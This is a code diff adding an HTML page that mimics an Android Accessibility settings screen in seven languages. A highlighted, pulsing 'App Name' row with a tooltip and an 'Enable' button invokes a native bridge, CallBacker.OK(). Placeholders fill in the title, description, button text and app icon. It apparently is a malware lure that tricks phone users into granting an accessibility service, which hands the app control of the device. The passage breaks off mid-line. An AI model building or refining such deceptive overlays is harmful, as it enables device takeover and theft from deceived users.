@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: sans-serif;
+            background: #000;
+            color: #f0f0f0;
+            cursor: pointer;
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+            -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+
+
+        .container {
+            padding: 20px;
+            position: relative;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+
+        .section-title-1 {
+            color: #ffb6c1;
+            margin: 30px 0 10px;
+
+            font-size: 14px;
+        }
+
+        .section-title {
+            color: #ffb6c1;
+            margin-top: 99px;
+            font-size: 14px;
+        }
+
+        .item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .item svg {
+            width: 30px;
+            height: 30px;
+            margin-right: 15px;
+            border-radius: 50%;
+            padding: 5px;
+        }
+
+        .item-content {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .item-content .title {
+            font-size: 18px;
+        }
+
+        .item-content .subtitle {
+            font-size: 14px;
+            color: #bbb;
+        }
+
+
+        .highlight {
+            border: 2px solid #00aaff;
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 60px;
+
+            animation: shrinkGrow 2s infinite;
+        }
+
+        .tooltip {
+            position: absolute;
+            top: 100%;
+            left: 10px;
+            margin-top: 10px;
+            background: rgba(0, 170, 255, 0.964);
+            padding: 14px 18px;
+            border-radius: 12px;
+            font-size: 14px;
+            color: #000000;
+            max-width: 300px;
+            width: max-content;
+            min-width: 320px;
+            box-sizing: border-box;
+            text-align: center;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            white-space: normal;
+            z-index: 111;
+        }
+
+        .tooltip::after {
+            content: '';
+            position: absolute;
+            top: -17px;
+            left: 20px;
+            border-width: 8px;
+            border-style: solid;
+            border-color: transparent transparent rgba(0, 170, 255, 0.85) transparent;
+        }
+
+
+        .fab {
+            position: fixed;
+            bottom: 50px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #2196F3;
+            color: #fff;
+            border: none;
+            border-radius: 50px;
+            padding: 9px 40px;
+            font-size: 18px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            cursor: pointer;
+           
+        }
+
+        @keyframes shrinkGrow {
+
+            0%,
+            100% {
+
+                background-color: #6060607b;
+            }
+
+            50% {
+
+                background-color: #afafaf00;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1 id="accessibility">Accessibility</h1>
+        <div class="section-title-1" id="downloadedapps">Downloaded apps</div>
+
+        <div id="boxtop" class="item highlight">
+            <img style="width: 30px; height: 30px; padding: 10px; border-radius: 50%;"
+                src="data:image/png;base64,[BASE-ICO]" alt="" onerror="this.style.display='none'">
+            <div class="item-content">
+                <div class="title" id="appname">App Name</div>
+                <div class="subtitle" id="off1">Off</div>
+            </div>
+            <div class="tooltip" id="tooltipdesc">Tap here to manage the app settings and permissions easily without any
+                confusion</div>
+        </div>
+        <div class="section-title" id="display">Display</div>
+        <div class="item">
+            <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#666666">
+                <path
+                    d="M256-240h84l44-122h192l44 122h84L522-720h-84L256-240Zm152-192 70-198h4l70 198H408ZM160-80q-33 0-56.5-23.5T80-160v-640q0-33 23.5-56.5T160-880h640q33 0 56.5 23.5T880-800v640q0 33-23.5 56.5T800-80H160Z" />
+            </svg>
+            <div class="item-content">
+                <div class="title" id="displaysizeandtext">Display size and text</div>
+            </div>
+        </div>
+        <div class="item">
+            <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#666666">
+                <path
+                    d="M360-380v-60h240v60H360Zm-40-120v-60h320v60H320ZM280-40q-33 0-56.5-23.5T200-120v-720q0-33 23.5-56.5T280-920h400q33 0 56.5 23.5T760-840v720q0 33-23.5 56.5T680-40H280Zm0-200h400v-480H280v480Z" />
+            </svg>
+            <div class="item-content">
+                <div class="title" id="colorandmotion">Color and motion</div>
+            </div>
+        </div>
+
+        <div class="item">
+            <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#666666">
+                <path
+                    d="M784-120 532-372q-30 24-69 38t-83 14q-109 0-184.5-75.5T120-580q0-109 75.5-184.5T380-840q109 0 184.5 75.5T640-580q0 44-14 83t-38 69l252 252-56 56ZM380-400q75 0 127.5-52.5T560-580q0-75-52.5-127.5T380-760q-75 0-127.5 52.5T200-580q0 75 52.5 127.5T380-400Zm-40-60v-80h-80v-80h80v-80h80v80h80v80h-80v80h-80Z" />
+            </svg>
+            <div class="item-content">
+                <div class="title" id="magnification">Magnification</div>
+                <div class="subtitle" id="magnificationsub">Off / Zoom in on the screen</div>
+            </div>
+        </div>
+
+        <div class="section-title-1" id="interactioncontrols">Interaction controls</div>
+
+        <div class="item">
+            <svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 -960 960 960" width="24px" fill="#666666">
+                <path
+                    d="M280-420q25 0 42.5-17.5T340-480q0-25-17.5-42.5T280-540q-25 0-42.5 17.5T220-480q0 25 17.5 42.5T280-420Zm200 0q25 0 42.5-17.5T540-480q0-25-17.5-42.5T480-540q-25 0-42.5 17.5T420-480q0 25 17.5 42.5T480-420Zm200 0q25 0 42.5-17.5T740-480q0-25-17.5-42.5T680-540q-25 0-42.5 17.5T620-480q0 25 17.5 42.5T680-420ZM480-80q-83 0-156-31.5T197-197q-54-54-85.5-127T80-480q0-83 31.5-156T197-763q54-54 127-85.5T480-880q83 0 156 31.5T763-763q54 54 85.5 127T880-480q0 83-31.5 156T763-197q-54 54-127 85.5T480-80Z" />
+            </svg>
+            <div class="item-content">
+                <div class="title" id="accessibilitymenu">Accessibility Menu</div>
+                <div class="subtitle" id="accessibilitymenusub">Off / Control device via large menu</div>
+            </div>
+        </div>
+    </div>
+
+    <button class="fab" id="enablebtn">Enable</button>
+</body>
+<script>
+    var lang = "[LNG]";
+
+    var objLang = {
+        'en': {
+            'accessibility': '[TITLE]',
+            'downloadedapps': 'Downloaded apps',
+            'appname': 'App Name',
+            'off': 'Off',
+            'tooltipdesc': '[DIS]',
+            'display': 'Display',
+            'displaysizeandtext': 'Display size and text',
+            'colorandmotion': 'Color and motion',
+            'magnification': 'Magnification',
+            'magnificationsub': 'Off / Zoom in on the screen',
+            'interactioncontrols': 'Interaction controls',
+            'accessibilitymenu': 'Accessibility Menu',
+            'accessibilitymenusub': 'Off / Control device via large menu',
+            'enablebtn': '[BTN]'
+        },
+        'ar': {
+            'accessibility': '[TITLE]',
+            'downloadedapps': 'التطبيقات المحملة',
+            'appname': 'App Name',
+            'off': 'معطل',
+            'tooltipdesc': '[DIS]',
+            'display': 'العرض',
+            'displaysizeandtext': 'حجم الشاشة والنص',
+            'colorandmotion': 'اللون والحركة',
+            'magnification': 'التكبير',
+            'magnificationsub': 'معطل / تكبير الشاشة',
+            'interactioncontrols': 'عناصر التحكم بالتفاعل',
+            'accessibilitymenu': 'قائمة الوصول',
+            'accessibilitymenusub': 'معطل / التحكم بالجهاز عبر قائمة كبيرة',
+            'enablebtn': '[BTN]'
+        },
+        'zh': {
+            'accessibility': '[TITLE]',
+            'downloadedapps': '已下载的应用',
+            'appname': 'App Name',
+            'off': '关闭',
+            'tooltipdesc': '[DIS]',
+            'display': '显示',
+            'displaysizeandtext': '显示大小和文字',
+            'colorandmotion': '颜色与动态效果',
+            'magnification': '放大',
+            'magnificationsub': '关闭 / 放大屏幕',
+            'interactioncontrols': '交互控制',
+            'accessibilitymenu': '辅助功能菜单',
+            'accessibilitymenusub': '关闭 / 通过大型菜单控制设备',
+            'enablebtn': '[BTN]'
+        },
+        'ru': {
+            'accessibility': '[TITLE]',
+            'downloadedapps': 'Загруженные приложения',
+            'appname': 'App Name',
+            'off': 'ВЫКЛ',
+            'tooltipdesc': '[DIS]',
+            'display': 'Дисплей',
+            'displaysizeandtext': 'Размер дисплея и текста',
+            'colorandmotion': 'Цвет и движение',
+            'magnification': 'Увеличение',
+            'magnificationsub': 'ВЫКЛ / Увеличение экрана',
+            'interactioncontrols': 'Элементы управления взаимодействием',
+            'accessibilitymenu': 'Меню специальных возможностей',
+            'accessibilitymenusub': 'ВЫКЛ / Управление устройством через большое меню',
+            'enablebtn': '[BTN]'
+        },
+        'tr': {
+            'accessibility': '[TITLE]',
+            'downloadedapps': 'İndirilen uygulamalar',
+            'appname': 'App Name',
+            'off': 'KAPALI',
+            'tooltipdesc': '[DIS]',
+            'display': 'Görüntü',
+            'displaysizeandtext': 'Görüntü boyutu ve metin',
+            'colorandmotion': 'Renk ve hareket',
+            'magnification': 'Büyütme',
+            'magnificationsub': 'Kapalı / Ekranı yakınlaştır',
+            'interactioncontrols': 'Etkileşim kontrolleri',
+            'accessibilitymenu': 'Erişilebilirlik Menüsü',
+            'accessibilitymenusub': 'Kapalı / Cihazı büyük bir menü üzerinden kontrol edin',
+            'enablebtn': '[BTN]'
+        },
+        'es': {
+            'accessibility': '[TITLE]',
+            'downloadedapps': 'Aplicaciones descargadas',
+            'appname': 'App Name',
+            'off': 'APAGADO',
+            'tooltipdesc': '[DIS]',
+            'display': 'Pantalla',
+            'displaysizeandtext': 'Tamaño de pantalla y texto',
+            'colorandmotion': 'Color y movimiento',
+            'magnification': 'Ampliación',
+            'magnificationsub': 'Apagado / Acercar la pantalla',
+            'interactioncontrols': 'Controles de interacción',
+            'accessibilitymenu': 'Menú de accesibilidad',
+            'accessibilitymenusub': 'Apagado / Controlar el dispositivo mediante un menú grande',
+            'enablebtn': '[BTN]'
+        },
+        'pt': {
+            'accessibility': '[TITLE]',
+            'downloadedapps': 'Aplicativos baixados',
+            'appname': 'App Name',
+            'off': 'DESLIGADO',
+            'tooltipdesc': '[DIS]',
+            'display': 'Tela',
+            'displaysizeandtext': 'Tamanho da tela e texto',
+            'colorandmotion': 'Cor e movimento',
+            'magnification': 'Ampliação',
+            'magnificationsub': 'Desligado / Aumentar a tela',
+            'interactioncontrols': 'Controles de interação',
+            'accessibilitymenu': 'Menu de acessibilidade',
+            'accessibilitymenusub': 'Desligado / Controle o dispositivo através de um menu grande',
+            'enablebtn': '[BTN]'
+        }
+    }
+
+    var locale = objLang[lang] == undefined ? objLang['en'] : objLang[lang];
+    document.getElementById('accessibility').innerText = locale["accessibility"];
+    document.getElementById('downloadedapps').innerText = locale["downloadedapps"];
+    document.getElementById('appname').innerText = locale["appname"];
+    document.getElementById('off1').innerText = locale["off"];
+    document.getElementById('tooltipdesc').innerText = locale["tooltipdesc"];
+    document.getElementById('display').innerText = locale["display"];
+    document.getElementById('displaysizeandtext').innerText = locale["displaysizeandtext"];
+    document.getElementById('colorandmotion').innerText = locale["colorandmotion"];
+    document.getElementById('magnification').innerText = locale["magnification"];
+    document.getElementById('magnificationsub').innerText = locale["magnificationsub"];
+    document.getElementById('interactioncontrols').innerText = locale["interactioncontrols"];
+    document.getElementById('accessibilitymenu').innerText = locale["accessibilitymenu"];
+    document.getElementById('accessibilitymenusub').innerText = locale["accessibilitymenusub"];
+    document.getElementById('enablebtn').innerText = locale["enablebtn"];
+    function ClickOK() {
+        CallBacker.OK();
+    }
+
+    document.getElementById('enablebtn').addEventListener('click', function () {
+        ClickOK();
+    });
+    document.getElementById('boxtop').addEvent
